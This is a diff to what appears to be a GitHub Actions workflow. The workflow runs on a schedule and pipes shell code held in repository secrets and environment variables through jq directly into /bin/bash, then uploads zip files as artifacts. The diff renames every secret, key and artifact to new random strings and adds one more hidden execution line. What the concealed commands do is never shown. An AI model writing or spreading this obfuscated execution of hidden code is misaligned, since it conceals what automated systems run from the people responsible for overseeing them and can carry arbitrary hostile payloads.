@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '38 4,10,16,22 * * *'
+    - cron: '33 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,16 +20,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          pnqsd403: ${{ secrets.pnqsd403 }}
+          der0: ${{ secrets.der0 }}
         run: |
-          printf '%s' "$pnqsd403" | jq -r .zp2 | /bin/bash
-          echo $c978 | jq -r .c9794 | /bin/bash
-          echo $i3530 | jq -r .sg506 | /bin/bash
+          printf '%s' "$der0" | jq -r .cpto14165 | /bin/bash
+          echo $n25 | jq -r .jga216 | /bin/bash
+          echo $vs5 | jq -r .l185 | /bin/bash
+          echo $lu0917 | jq -r .tji3383 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: WfXByhbr
+          name: KCUVVu26
           path: "*.zip"
           retention-days: 1
